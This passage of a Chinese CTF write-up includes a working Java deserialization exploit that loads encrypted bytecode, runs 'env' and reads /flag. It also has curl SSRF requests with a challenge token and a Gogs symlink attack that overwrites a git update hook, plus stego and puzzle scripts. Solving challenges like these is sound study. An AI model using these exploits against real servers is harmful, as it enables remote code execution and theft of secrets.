        return "SUCCESS: Configuration synchronized at internal level.";
    } catch (Exception e) {
        // 所有的报错都被吞了，只返回通用错误
        return "ERROR: Malformed configuration stream.";
    }
}
```

2. 核心漏洞类：`ConfigDataWrapper.class`

这是 Payload 执行的地方。源码显示它利用反射绕过了权限限制。

```text
public class ConfigDataWrapper implements Serializable {
    private String configId;
    private byte[] ClassByte; // 存储我们加密后的恶意字节码
    private String sign;      // 校验标志位

    public String toString() {
        // 必须满足 configId 以 CONF- 开头且 sign 为 ready 才能进入代码加载逻辑
        if (this.ClassByte != null && "ready".equals(this.sign) && this.configId.startsWith("CONF-")) {
            try {
                // 解密逻辑：异或 0xFF
                byte[] decrypted = new byte[this.ClassByte.length];
                for (int i = 0; i < this.ClassByte.length; i++) {
                    decrypted[i] = (byte)(this.ClassByte[i] ^ 0xFF);
                }

                // 通过反射调用 ClassLoader.defineClass (这个方法原先是 protected 的)
                // 这里的 hex 解码后就是 "defineClass"
                String methodName = hexDecode("646566696e65436c617373");
                Method m = ClassLoader.class.getDeclaredMethod(methodName, String.class, byte[].class, int.class, int.class);
                m.setAccessible(true);
                
                ClassLoader loader = Thread.currentThread().getContextClassLoader();
                Class<?> clazz = (Class<?>) m.invoke(loader, null, decrypted, 0, decrypted.length);
                
                // 实例化类：这将直接触发恶意类的构造函数！
                clazz.newInstance();
                
                return "ConfigDataWrapper [Verified Context Loaded]";
            } catch (Exception e) {
                // 异常被静默处理，这也是为什么直接 throw 异常拿不到回显的原因
                return "ConfigDataWrapper [Verification Failed]";
            }
        }
        return "ConfigDataWrapper [Status: STANDBY]";
    }
}
```

基于上述源码， POC 必须完成以下绕过

协议伪造

**源码依据**：`dis.readUTF()` 和 `dis.readInt()`。 **Poc 实现**：

```text
oos.writeUTF("InternalManager");
oos.writeInt(2025);
```

如果不加这两行，Controller 会直接返回 `Malformed` 错误。

绕过类加载限制

**源码依据**：`clazz.newInstance()`。 **Poc 实现**： 我们将恶意代码写在 `Exp` 类的**构造函数**`public Exp() { ... }` 中。因为 `newInstance()` 会调用无参构造函数，所以代码在类加载的一瞬间就会执行。

数据窃取

**源码依据**：`catch (Exception e)` 吞掉异常 + 无标准输出回显。 **Poc 实现**： 既然服务器不给输出，我们就利用反射从 **ThreadLocal**（Spring 的 `RequestContextHolder`）中把当前的 `Response` 对象偷出来，强行把 Flag 塞进 Response 的 Header 中送回客户端。

解题流程

必须在本地建立完全一致的包路径和类名，否则反序列化时会因为 serialVersionUID 或类路径不匹配报错。

```text
mkdir -p com/unictf/ctf/tools
```

```text
package com.unictf.ctf.tools;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;

public class ConfigDataWrapper implements Serializable {
    private static final long serialVersionUID = 6623142231L; // 必须一致
    private String configId;
    private Map<String, String> metadata = new HashMap<>();
    private long lastModified;
    private int checksum;
    private transient String debugInfo;
    private byte[] ClassByte; // 存放恶意字节码的字段
    private String sign;      // 校验位
}
```

针对题目中 `toString()` 吞掉异常且不回显的特性，我们采用“**随机类名 + Spring Header 注入 + Base64 避灾**”策略。

**关键逻辑解析**：

+ **随机类名**：防止 JVM 因为类名重复拒绝加载新 Payload。
+ **Base64 编码**：解决 `env` 结果中的换行符导致 HTTP 400 错误。

```text
// 脚本会自动修改类名，这里以模板为例
public class Exp_TEMPLATENAME {
    public Exp_TEMPLATENAME() {
        try {
            // 1. 执行 env 获取环境变量（Flag 通常在此）
            java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec("env").getInputStream()).useDelimiter("\\A");
            String result = s.hasNext() ? s.next() : "No Env Found";
            
            // 2. 在 Java 内部转 Base64，确保结果只有字母数字，不触发 400 错误
            String b64 = java.util.Base64.getEncoder().encodeToString(result.getBytes("UTF-8"));

            // 3. 反射获取 Spring Response 对象
            Class<?> holder = Class.forName("org.springframework.web.context.request.RequestContextHolder");
            Object attrs = holder.getMethod("getRequestAttributes").invoke(null);
            if (attrs != null) {
                Object resp = attrs.getClass().getMethod("getResponse").invoke(attrs);
                // 4. 将结果塞入 Header
                resp.getClass().getMethod("setHeader", String.class, String.class).invoke(resp, "X-Flag", b64);
            }
        } catch (Exception e) {}
    }
}
```

给出poc

```text
import java.io.*;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Base64;
import java.util.Random;
import javax.tools.JavaCompiler;
import javax.tools.ToolProvider;

public class Poc {

    public static void main(String[] args) throws Exception {
        // 生成随机类名，防止类加载冲突
        String className = "Exp_" + System.currentTimeMillis();
        System.out.println("[*] 构建随机类名 Payload: " + className);

        File dir = new File("com/unictf/ctf/tools");
        if (!dir.exists()) dir.mkdirs();
        createTargetClassSource(new File(dir, "ConfigDataWrapper.java"));
        
        // 动态生成带随机类名的 Exp
        createEvilSource(new File(className + ".java"), className);

        // 编译
        compile(className + ".java");
        compile("com/unictf/ctf/tools/ConfigDataWrapper.java");

        // 读取并加密
        byte[] classBytes = readBytes(className + ".class");
        byte[] encryptedBytes = new byte[classBytes.length];
        for (int i = 0; i < classBytes.length; i++) {
            encryptedBytes[i] = (byte) (classBytes[i] ^ 0xFF);
        }

        File currentDir = new File(".");
        java.net.URLClassLoader loader = new java.net.URLClassLoader(new java.net.URL[]{currentDir.toURI().toURL()});
        Class<?> wrapperClass = loader.loadClass("com.unictf.ctf.tools.ConfigDataWrapper");
        
        Object wrapper = wrapperClass.newInstance();
        setField(wrapper, "configId", "CONF-" + className);
        setField(wrapper, "sign", "ready");
        setField(wrapper, "ClassByte", encryptedBytes);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeUTF("InternalManager");
        oos.writeInt(2025);
        oos.writeObject(wrapper);
        oos.close();

        String base64 = Base64.getEncoder().encodeToString(barr.toByteArray());
        String urlEncoded = URLEncoder.encode(base64, "UTF-8");
        try (FileWriter fw = new FileWriter("payload.txt")) {
            fw.write("configData=" + urlEncoded);
        }

        System.out.println("\n[Payload Ready] 已生成 payload.txt");
        System.out.println("====================================================================================");
        System.out.println("curl -v -d @payload.txt http://8888-4c862bbe-6cae-4657-b536-eaef64de3640.challenge.ctfplus.cn/api/user/settings/import");
        System.out.println("====================================================================================");
        
        // 清理临时文件
        new File(className + ".java").delete();
        new File(className + ".class").delete();
    }

    private static void setField(Object obj, String name, Object val) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, val);
    }
    private static byte[] readBytes(String path) throws IOException {
        File f = new File(path);
        byte[] b = new byte[(int)f.length()];
        try (FileInputStream fis = new FileInputStream(f)) { fis.read(b); }
        return b;
    }
    private static void compile(String path) {
        JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
        compiler.run(null, null, null, "-source", "1.8", "-target", "1.8", "-nowarn", path);
    }
    private static void createTargetClassSource(File f) throws IOException {
        String source = "package com.unictf.ctf.tools;\n" +
            "import java.io.Serializable;\n" +
            "import java.util.HashMap;\n" +
            "import java.util.Map;\n" +
            "public class ConfigDataWrapper implements Serializable {\n" +
            "  private static final long serialVersionUID = 6623142231L;\n" +
            "  private String configId;\n" +
            "  private Map<String, String> metadata = new HashMap<>();\n" +
            "  private long lastModified;\n" +
            "  private int checksum;\n" +
            "  private transient String debugInfo;\n" +
            "  private byte[] ClassByte;\n" +
            "  private String sign;\n" +
            "}";
        try (FileWriter fw = new FileWriter(f)) { fw.write(source); }
    }

    // 【核心】动态类名 + 纯Java执行 + Java Base64回显
    private static void createEvilSource(File f, String className) throws IOException {
        String source = "public class " + className + " {\n" +
            "    public " + className + "() {\n" +
            "        try {\n" +
            "            String result = \"\";\n" +
            "            // 尝试读取 /flag\n" +
            "            java.io.File file = new java.io.File(\"/flag\");\n" +
            "            if (file.exists()) {\n" +
            "                java.io.FileInputStream fis = new java.io.FileInputStream(file);\n" +
            "                byte[] data = new byte[(int)file.length()];\n" +
            "                fis.read(data);\n" +
            "                fis.close();\n" +
            "                result = new String(data, \"UTF-8\");\n" +
            "            } else {\n" +
            "                // 备选：执行 env 命令 (防止 /flag 不存在)\n" +
            "                java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(\"env\").getInputStream()).useDelimiter(\"\\\\A\");\n" +
            "                result = s.hasNext() ? s.next() : \"No Flag and No Env\";\n" +
            "            }\n" +
            "            \n" +
            "            // 关键：在 Java 内部进行 Base64，确保 Header 绝对安全\n" +
            "            String b64 = java.util.Base64.getEncoder().encodeToString(result.getBytes());\n" +
            "\n" +
            "            ClassLoader cl = Thread.currentThread().getContextClassLoader();\n" +
            "            Class<?> holder = cl.loadClass(\"org.springframework.web.context.request.RequestContextHolder\");\n" +
            "            Object attrs = holder.getMethod(\"getRequestAttributes\").invoke(null);\n" +
            "            if (attrs != null) {\n" +
            "                Object resp = attrs.getClass().getMethod(\"getResponse\").invoke(attrs);\n" +
            "                resp.getClass().getMethod(\"setHeader\", String.class, String.class).invoke(resp, \"X-Flag\", b64);\n" +
            "            }\n" +
            "        } catch (Throwable e) {\n" +
            "            try {\n" +
            "                // 报错回显\n" +
            "                String err = java.util.Base64.getEncoder().encodeToString((\"ERR:\" + e.toString()).getBytes());\n" +
            "                ClassLoader cl = Thread.currentThread().getContextClassLoader();\n" +
            "                Class<?> holder = cl.loadClass(\"org.springframework.web.context.request.RequestContextHolder\");\n" +
            "                Object attrs = holder.getMethod(\"getRequestAttributes\").invoke(null);\n" +
            "                Object resp = attrs.getClass().getMethod(\"getResponse\").invoke(attrs);\n" +
            "                resp.getClass().getMethod(\"setHeader\", String.class, String.class).invoke(resp, \"X-Error\", err);\n" +
            "            } catch (Throwable ex) {}\n" +
            "        }\n" +
            "    }\n" +
            "}";
        try (FileWriter fw = new FileWriter(f)) { fw.write(source); }
    }
}
```

得到paylaod后发送，响应头中有X-flag头，解码得到flag









### Bytecode Compiler
一个字节码编译器，有个bndle.js，先拿token

通过分析 `bundle.js`（WASM 的胶水代码层），我们发现指令分发逻辑如下：

```text
const signedFlags = (flags << 24) >> 24; // 将 flags 转为 8 位有符号数
const dispatchIndex = signedFlags < 0 
    ? (((signedFlags >>> 0) | opId) % 4) // 逻辑 A：触发隐藏索引
    : (opId % 4);                        // 逻辑 B：正常索引
```

当 `flags` 为 `1`（诊断模式）时，`signedFlags` 为 `1`，执行正常的 `opId`。但如果 `flags` 为 `255`（0xFF），`signedFlags` 会溢出变为 `-1`，从而强制 `dispatchIndex` 计算结果为 `3`。索引 `3` 对应的是 **Internal Diagnostic Slot**（内部诊断槽位）。

2. 执行命令与操作

由于前端 UI 限制了 `flags` 只能为 `0` 或 `1`，我们需要在内存中强制修改。

+ **操作步骤**：
    1. 打开浏览器 F12，进入 **Sources** 面板，在 `bundle.js` 中找到 `const signedFlags = (flags << 24) >> 24;` 这一行打断点。
    2. 在页面输入 `ECHO token`，勾选“诊断模式”，点击运行。
    3. 程序暂停在断点处，在 **Console** 输入 `flags = 255` 并回车。
    4. 按下 **F8** 恢复运行。
+ **结果**： 后端返回的 JSON 中，`vm_output` 字段会打印出 Token： `you-got-me-baby-where-is-my-bytecode`

拿到token开始ssrf

题目提示 `/api/fetch` 接口支持后端拉取。直接请求 `http://127.0.0.1/flag` 会被拦截（Blocked Host/Path）。 我们首先通过 Token 授权访问 `robots.txt` 来寻找线索：

```text
curl -i "http://80-59f14a40-b4df-426d-98af-8ccd1c65b176.challenge.ctfplus.cn/api/fetch?url=http://127.0.0.1/robots.txt&token=you-got-me-baby-where-is-my-bytecode"
```

+ **发现**： 返回内容显示 `Disallow: /internal/flag`。

2. 绕过黑名单

后端对包含 `api`、`flag`（可能）等字样的路径有正则黑名单。但 `/internal/flag` 是一个不含 `api` 关键字的路径，通常可以绕过基于字符串匹配的简单防火墙。

```text
curl -i "http://80-59f14a40-b4df-426d-98af-8ccd1c65b176.challenge.ctfplus.cn/api/fetch?url=http://127.0.0.1/internal/flag&token=you-got-me-baby-where-is-my-bytecode"
```

![](/images/wp/unictf-wp/image-017.png)



**补充**：在 JS 中，`(flags << 24) >> 24` 是一种常见的技巧，用于将一个无符号字节（0-255）强制转换为 8 位有符号整数（-128 到 127）。

+ 当 `flags = 255` (二进制 `11111111`)：
    - 左移 24 位后，该位占据了 32 位整数的符号位。
    - 右移 24 位（带符号右移），结果变为 `-1`。

这是触发 WASM 内部诊断逻辑的关键。

2. SSRF (Server-Side Request Forgery)

SSRF 允许攻击者诱导服务器向内部网络发起请求。

+ **管理头注入**：本题中 Token 的作用是让服务器在发起内部请求时，自动添加 `X-Admin: true` 之类的 Header，从而通过内部服务的身份校验。
+ **robots.txt 利用**：在渗透测试中，`robots.txt` 经常被用来寻找开发者试图隐藏的内部路径。

3. FNV-1a 哈希算法

Packet 校验使用的 `fnv1a32` 是一种非加密型哈希，广泛用于校验数据完整性。

$$hash = (hash \oplus byte) \times 16777619 \pmod{2^{32}}$$

在 CTF 中，如果需要伪造 Packet，必须按照此公式重新计算校验码，否则后端会返回 `invalid packet`。



### gogogos
注册登录后，是一个gogs仓库

我们需要确认 Gogs 仓库在服务器上的物理存储路径。根据题目提示或常见 Gogs 部署习惯，路径通常为： `/home/git/gogs-repositories/[UID]/[REPO_NAME].git`

1. **创建目标仓库**：在 Web 界面或通过 API 创建一个名为 `flag-hunter` 的仓库。

**生成 Access Token**：为了通过 API 修改文件，我们需要一个 Token。

（利用账号密码 1:1）：

```text
curl -u 1:1 -X POST "http://[TARGET_URL]/api/v1/users/1/tokens" -H "Content-Type: application/json" -d '{"name":"pwn_token"}'
```

**结果**：获得 Token `2676cff4c67bb63c9993b277cd6e1593dd55d701`

利用 Git 的 `mode 120000` 特性。我们在本地创建一个名为 `hook_c` 的文件，但它实际上是一个指向服务器 `update` 钩子的软链接。

```text
# 1. 初始化本地环境
mkdir gogs_pwn && cd gogs_pwn
git init
git config user.email "hacker@ctf.com"
git config user.name "hacker"

# 2. 创建软链接
# 这里的目标路径必须是绝对物理路径
ln -sf /home/git/gogs-repositories/1/flag-hunter.git/hooks/update hook_c

# 3. 推送至服务端
git add hook_c
git commit -m "deploy symlink"
git remote add origin "http://1:1@[TARGET_URL]/1/flag-hunter.git"
git push -f origin master
```

现在服务器上的 `hook_c` 已经是一个“快捷方式”了。当我们通过 Gogs API 修改 `hook_c` 的内容时，Gogs 会顺着链接把内容写入真正的物理文件 `/hooks/update` 中。

**注入脚本 (**`**exp.py**`**)**:

```text
import requests, base64

# 配置
TOKEN = "2676cff4c67bb63c9993b277cd6e1593dd55d701"
API_BASE = "http://[TARGET_URL]/api/v1/repos/1/flag-hunter"

# 载荷：搜索环境变量并重定向到 stderr (>&2)
payload = """#!/bin/bash
echo -e "\\n[*] SEARCHING FLAG..." >&2
env | grep "FLAG" >&2
exit 0
"""

headers = {"Authorization": f"token {TOKEN}", "Content-Type": "application/json"}

# 获取 SHA (修改文件必须项)
r = requests.get(f"{API_BASE}/contents/hook_c", headers=headers)
sha = r.json().get("sha")

# 注入
data = {
    "message": "inject hook",
    "content": base64.b64encode(payload.encode()).decode(),
    "sha": sha
}
requests.put(f"{API_BASE}/contents/hook_c", headers=headers, json=data)
print("[+] Hook 注入成功！")
```

`update` 钩子会在每次 `git push` 时由服务器执行。其 `stderr` 输出会直接回显给客户端终端。

```text
# 修改任意文件产生新提交
echo $(date) >> trigger.txt
git add trigger.txt
git commit -m "pwn"

# 触发并观察回显
git push origin master
```

![](/images/wp/unictf-wp/image-018.png)







## misc
### Welcome
![](/images/wp/unictf-wp/image-019.png)





### Silent Resolver
一个流量包，打开后很容易发现这些数据

![](/images/wp/unictf-wp/image-020.png)

`0000` 号包的 Payload 开头是 `kbfq`。Base32 解码 `kbfq` 对应十六进制的 `50 4B` (即 ASCII 的 "PK")，这是 **ZIP 压缩包**的文件头。  

明显藏了个zip，直接提取

```text
import scapy.all as scapy
import base64
import struct

def analyze_pcap(pcap_file):
    # 读取 pcap 文件
    packets = scapy.rdpcap(pcap_file)
    
    data_dict = {}
    
    print("[*] 分析 DNS 流量中...")
    
    for pkt in packets:
        # 检查是否包含 DNS 层且是查询包 (qr=0)
        if pkt.haslayer(scapy.DNS) and pkt.haslayer(scapy.DNSQR):
            qname = pkt[scapy.DNSQR].qname.decode('utf-8')
            
            # 过滤出包含特征域名的包
            if 'exfil.unictf.local' in qname:
                # 移除末尾的 .
                qname = qname.strip('.')
                parts = qname.split('.')
                
                # 提取序号和 payload
                # 格式通常是: [SEQ].[PAYLOAD].[ID].exfil.unictf.local
                try:
                    seq_str = parts[0]
                    payload = parts[1]
                    
                    # 过滤掉结束标志 (例如 ffff)
                    if seq_str == 'ffff':
                        continue
                        
                    seq = int(seq_str, 16) # 假设序号是十六进制
                    
                    # 避免重复包
                    if seq not in data_dict:
                        data_dict[seq] = payload
                except:
                    continue

    # 按序号排序
    sorted_payload = ""
    for i in sorted(data_dict.keys()):
        print(f"[-]处理序号 {i:04d}: {data_dict[i][:10]}...")
        sorted_payload += data_dict[i]

    print(f"[*] 提取到的完整 Payload (Base32): {sorted_payload[:50]}...")

    # Base32 解码
    # Python 的 base32 解码通常需要大写，并且对 Padding 有要求
    try:
        # 转换为大写
        b32_data = sorted_payload.upper()
        # 补齐 Padding (=) 以满足 8 的倍数，防止解码报错
        padding = len(b32_data) % 8
        if padding != 0:
            b32_data += '=' * (8 - padding)
            
        decoded_data = base64.b32decode(b32_data)
        
        # 写入文件
        output_filename = "result.zip"
        with open(output_filename, "wb") as f:
            f.write(decoded_data)
            
        print(f"[+] 解码成功! 文件已保存为: {output_filename}")
        print("[!] 这是一个 ZIP 文件，请尝试解压它。")
        
    except Exception as e:
        print(f"[x] 解码失败: {e}")

if __name__ == "__main__":
    analyze_pcap("traffic.pcapng")
```

直接得到一个zip，解压得到flag.txt

![](/images/wp/unictf-wp/image-021.png)





### 截取的线索
一个名为7的文件和一张png，只有一条像素，明显的黑白条纹，肯定是二进制

图片总宽度为 $96$ 像素。

$96 \div 8 = 12$ 字节。

通常黑色代表0，白色代表1，提取出来再转换为ASCII字符

```text
from PIL import Image

def solve_scanning_line(image_path, output_file='output.bin'):
    # 加载图片并转为灰度模式
    try:
        img = Image.open(image_path).convert('L')
    except Exception as e:
        return f"无法打开图片: {e}"

    width, height = img.size
    pixels = list(img.getdata())

    # 1. 提取 Bit：根据用户要求，黑色(0) -> 0，白色(255) -> 1
    # 考虑到图中存在渐变，使用 128 作为中间阈值
    bits = [1 if p > 128 else 0 for p in pixels]

    # 2. 每 8 bits 组合成一个字节
    byte_list = []
    for i in range(0, len(bits), 8):
        byte_bits = bits[i:i+8]
        if len(byte_bits) == 8:
            # 将 8 位二进制列表转换为整数 (高位在前)
            byte_str = "".join(map(str, byte_bits))
            byte_val = int(byte_str, 2)
            byte_list.append(byte_val)

    binary_data = bytes(byte_list)

    # 3. 输出结果
    print(f"处理像素总数: {len(pixels)}")
    print(f"提取字节总数: {len(binary_data)}")
    
    # 尝试作为 ASCII 文本输出
    try:
        text_result = binary_data.decode('ascii')
        print(f"解析得到的文本 (Flag 后半段): {text_result}")
    except:
        print("提取的内容包含非 ASCII 字符。")

    # 4. 保存为原始二进制文件
    with open(output_file, 'wb') as f:
        f.write(binary_data)
    print(f"原始二进制数据已保存至: {output_file}")

    return binary_data

if __name__ == "__main__":
    solve_scanning_line('截取的线索.png')
```

![](/images/wp/unictf-wp/image-022.png)

拿到后半段，前半段肯定在文件7里，记事本打开

![](/images/wp/unictf-wp/image-023.png)

其实就是密钥为7

`|` 经常被用作 Flag 前缀 `flag{` 或 `CTF{` 中左大括号 `{` 的掩码。

+ 检查字符 `|` 的 ASCII 码：$124$。
+ 计算 $124 \oplus 7 = 123$。
+ ASCII 码 $123$ 对应的字符正是 `**{**`。

明显就是XOR7，异或得到 UniCTF{P1ckle_the  

exp

```text
from PIL import Image

# 1. 解密文件 7
def solve_file_7(data, key=7):
    return "".join([chr(ord(c) ^ key) for c in data])

# 2. 解密图片扫描线
def solve_image(path):
    img = Image.open(path).convert('L')
    pixels = list(img.getdata())
    bits = "".join(['1' if p > 128 else '0' for p in pixels])
    
    # 8位一组转字节
    bytes_data = [int(bits[i:i+8], 2) for i in range(0, len(bits), 8)]
    return "".join([chr(b) for b in bytes_data])

# 执行
part1_raw = "RinDSA|W6dlkbXsob"
part1 = solve_file_7(part1_raw)
part2 = solve_image('截取的线索.png')

print(f"Flag: {part1 + part2}")
```







### 总裁四比特,这能玩？
给了一张jpg图片，binwalk分析发现有两张png，提取出来发现两张图片一样，py提取

```text
import os

def extract_png_from_file(input_file):
    with open(input_file, 'rb') as f:
        data = f.read()

    # PNG 文件头和文件尾的二进制标识
    header = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
    footer = b'\x49\x45\x4E\x44\xAE\x42\x60\x82'

    start_pos = 0
    count = 0

    while True:
        # 寻找 PNG 头部
        start_index = data.find(header, start_pos)
        if start_index == -1:
            break

        # 从头部位置开始寻找最近的 PNG 尾部
        end_index = data.find(footer, start_index)
        if end_index == -1:
            print(f"找到第 {count+1} 张图的头部，但未找到完整尾部。")
            break

        # 加上尾部标识本身的长度 (8字节)
        end_index += len(footer)
        
        # 提取数据并保存
        png_data = data[start_index:end_index]
        output_name = f'extracted_{count}.png'
        with open(output_name, 'wb') as out:
            out.write(png_data)
        
        print(f"成功提取: {output_name} (偏移量: {start_index} 到 {end_index})")
        
        count += 1
        start_pos = end_index  # 从当前图片尾部继续向后找

    if count == 0:
        print("未在文件中提取到 PNG 图片。")

# 将文件名改为你本地的文件名，比如 '比特.jpg'
extract_png_from_file('比特.jpg')
```

两张png异或发现是一模一样的图，但第一张图大小是第二张两倍，根据四比特的提示，尝试发现

设数据块 A 为 $High\_Part$，数据块 B 为 $Low\_Part$。

对于每一个位置 $i$，提取 $A[i]$ 的低 4 位作为新字节的高位，提取 $B[i]$ 的低 4 位作为新字节的低位。

计算公式：$New\_Byte = ((A[i] \text{ \& } 0x0F) \ll 4) \mid (B[i] \text{ \& } 0x0F)$

这个异常的两倍大小图片后面还藏了数据，通过半字节拼合得到新的图片

```text
import os

def solve_ctf_misc(input_file, block_size=747327):
    """
    针对比特.jpg 的半字节拼合解密脚本
    """
    with open(input_file, 'rb') as f:
        data = f.read()

    # 根据 WP 分析，隐写数据位于文件末尾的两段等长区域
    # 提取最后两个 block_size 大小的数据块
    if len(data) < block_size * 2:
        print("[-] 数据长度不足，请检查 offset。")
        return

    part_a = data[-block_size*2 : -block_size] # 对应 Ext1
    part_b = data[-block_size:]                # 对应 Gap A

    print(f"[*] 提取数据成功，块大小: {block_size}")
    
    # 核心解密：半字节拼合
    result = bytearray()
    for i in range(block_size):
        # 提取 A 的低 4 位作为高位，B 的低 4 位作为低位
        high_nibble = part_a[i] & 0x0F
        low_nibble = part_b[i] & 0x0F
        combined_byte = (high_nibble << 4) | low_nibble
        result.append(combined_byte)

    # 保存并验证
    output_name = "flag_final.png"
    if result.startswith(b'\x89PNG'):
        with open(output_name, 'wb') as f:
            f.write(result)
        print(f"[+] 解密成功！Flag 图片已保存为: {output_name}")
    else:
        # 如果头不对，尝试交换 A/B 顺序
        print("[-] 初始顺序匹配失败，尝试交换高低位顺序...")
        result_rev = bytearray()
        for i in range(block_size):
            result_rev.append(((part_b[i] & 0x0F) << 4) | (part_a[i] & 0x0F))
        
        if result_rev.startswith(b'\x89PNG'):
            with open(output_name, 'wb') as f:
                f.write(result_rev)
            print(f"[+] 交换顺序解密成功！已保存。")
        else:
            print("[-] 拼合失败，请检查数据块起始偏移。")

# 运行
solve_ctf_misc('比特.jpg')
```

提取出来依然是图片，但是发现Gap A 的高位隐藏了 ZIP 头 (PK).提取后得到压缩包，压缩包里依然是一张图片，

![](/images/wp/unictf-wp/image-024.png)

但是发现，图片只有728kb，压缩包是730kb，解压时也会提醒你有多余数据，binwalk发现多余数据里藏了txt，但是应该是在压缩包里，我提取数据流看到了pk，确定偏移用py提取即可

```text
import zipfile
import io
import os

def extract_flag_from_image():
    filename = '嘉豪.png'
    # 截图里 binwalk 显示的精确偏移量 (Decimal)
    offset = 747327 
    
    if not os.path.exists(filename):
        print(f"[-] 错误：找不到文件 {filename}，请确认脚本和图片在同一目录下。")
        return

    try:
        with open(filename, 'rb') as f:
            # 1. 移动指针到隐藏 Zip 的开头
            f.seek(offset)
            # 2. 读取后面所有数据（这就是那个隐藏的 Zip 包）
            zip_data = f.read()
            
            print(f"[+] 成功从偏移量 {offset} 读取到 {len(zip_data)} 字节数据")
            
            # 3. 在内存中把这段数据当做 Zip 文件打开
            # 相当于截图里生成的 B673F.zip
            try:
                with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
                    # 查看压缩包里有啥
                    print(f"[+] 压缩包内容: {zf.namelist()}")
                    
                    if 'flag.txt' in zf.namelist():
                        # 4. 读取 flag.txt
                        flag_content = zf.read('flag.txt')
                        print("\n" + "="*30)
                        print("🎉 提取到的 FLAG:")
                        print(flag_content.decode('utf-8'))
                        print("="*30 + "\n")
                    else:
                        print("[-] 压缩包里没找到 flag.txt，可能文件名不同？")
            
            except zipfile.BadZipFile:
                print("[-] 提取出的数据不是有效的 Zip 文件。可能偏移量不对或数据损坏。")
                # 备选：把数据存下来让你手动看
                with open('hidden_data.zip', 'wb') as out:
                    out.write(zip_data)
                print("[*] 已将提取出的数据保存为 hidden_data.zip，你可以尝试手动解压。")

    except Exception as e:
        print(f"[-] 发生错误: {e}")

if __name__ == '__main__':
    extract_flag_from_image()
```

‘<!-- 这是一张图片，ocr 内容为： -->
![](/images/wp/unictf-wp/image-025.png)







### Cube God
可以说是一个密码题了，

服务器要我们 连续完成 100 轮二阶魔方还原  ，而且魔方有一个面被完全遮挡，先尝试连一下容器，发现每一题只给了一秒不到时间计算，尝试优化算法发现还是不能通过，但是由于二阶魔方的状态空间较小（约 360 万种组合），但直接搜索 11 步（$18^{11}$）是不可能的。我们采用**时空折中**策略：

1. **离线预计算 (Offline)**：从复原状态开始，搜索所有 **7步** 以内能到达的状态，存入哈希表（Key=状态, Value=路径）。
2. **在线攻击 (Online)**：拿到题目状态后，仅需搜索 **4步**。每搜一步就去查表。
    - 如果查表命中，则总路径 = `当前路径` + `表路径的逆序`。
    - 总覆盖深度 = $4 + 7 = 11$，完美覆盖题目要求。

题目随机隐藏一个面，导致我们无法直接确定某些角块的朝向。简单的排除法在某些特定角度下会产生歧义（比如 URF 角块和 UBR 角块只看两面可能是一样的）。 **解决方案**：实现一个**回溯解析器 (Backtracking Parser)**。

+ 列出所有标准的 8 个角块。
+ 尝试将它们填入题目给出的空槽位。
+ 如果填入后导致冲突，则回溯。
+ 最终可能得到 1 个或多个“视觉上合法”的候选状态。脚本会对所有候选状态进行尝试，直到解出为止。

先生成彩虹表

```text
import collections
import pickle
import time

def get_permutations():
    # 预计算 18 种操作的置换数组，极大提升 Python 运行效率
    perms = {}
    # U (Up)
    p = list(range(24)); p[0],p[1],p[2],p[3]=2,0,3,1
    p[8],p[9],p[20],p[21],p[12],p[13],p[16],p[17] = 20,21,12,13,16,17,8,9
    perms['U'] = tuple(p)
    # U'
    p = list(range(24)); p[0],p[1],p[2],p[3]=1,3,0,2
    p[8],p[9],p[16],p[17],p[12],p[13],p[20],p[21] = 16,17,12,13,20,21,8,9
    perms["U'"] = tuple(p)
    # D (Down)
    p = list(range(24)); p[4],p[5],p[6],p[7]=6,4,7,5
    p[10],p[11],p[18],p[19],p[14],p[15],p[22],p[23] = 18,19,14,15,22,23,10,11
    perms['D'] = tuple(p)
    # D'
    p = list(range(24)); p[4],p[5],p[6],p[7]=5,7,4,6
    p[10],p[11],p[22],p[23],p[14],p[15],p[18],p[19] = 22,23,14,15,18,19,10,11
    perms["D'"] = tuple(p)
    # F (Front)
    base=list(range(24)); P=list(range(24)); P[8],P[9],P[10],P[11]=10,8,11,9
    P[2],P[3]=base[19],base[17]; P[17],P[19]=base[4],base[5]
    P[4],P[5]=base[22],base[20]; P[20],P[22]=base[2],base[3]
    perms['F'] = tuple(P)
    # F'
    base=list(range(24)); P=list(range(24)); P[8],P[9],P[10],P[11]=9,11,8,10
    P[2],P[3]=base[20],base[22]; P[20],P[22]=base[5],base[4]
    P[4],P[5]=base[17],base[19]; P[17],P[19]=base[3],base[2]
    perms["F'"] = tuple(P)
    # B (Back)
    base=list(range(24)); P=list(range(24)); P[12],P[13],P[14],P[15]=14,12,15,13
    P[0],P[1]=base[21],base[23]; P[21],P[23]=base[7],base[6]
    P[6],P[7]=base[16],base[18]; P[16],P[18]=base[1],base[0]
    perms['B'] = tuple(P)
    # B'
    base=list(range(24)); P=list(range(24)); P[12],P[13],P[14],P[15]=13,15,12,14
    P[0],P[1]=base[18],base[16]; P[16],P[18]=base[6],base[7]
    P[6],P[7]=base[23],base[21]; P[21],P[23]=base[0],base[1]
    perms["B'"] = tuple(P)
    # L (Left)
    base=list(range(24)); P=list(range(24)); P[16],P[17],P[18],P[19]=18,16,19,17
    P[0],P[2]=base[15],base[13]; P[13],P[15]=base[6],base[4]
    P[4],P[6]=base[8],base[10]; P[8],P[10]=base[0],base[2]
    perms['L'] = tuple(P)
    # L'
    base=list(range(24)); P=list(range(24)); P[16],P[17],P[18],P[19]=17,19,16,18
    P[0],P[2]=base[8],base[10]; P[8],P[10]=base[4],base[6]
    P[4],P[6]=base[15],base[13]; P[13],P[15]=base[2],base[0]
    perms["L'"] = tuple(P)
    # R (Right)
    base=list(range(24)); P=list(range(24)); P[20],P[21],P[22],P[23]=22,20,23,21
    P[1],P[3]=base[9],base[11]; P[9],P[11]=base[5],base[7]
    P[5],P[7]=base[14],base[12]; P[12],P[14]=base[3],base[1]
    perms['R'] = tuple(P)
    # R'
    base=list(range(24)); P=list(range(24)); P[20],P[21],P[22],P[23]=21,23,20,22
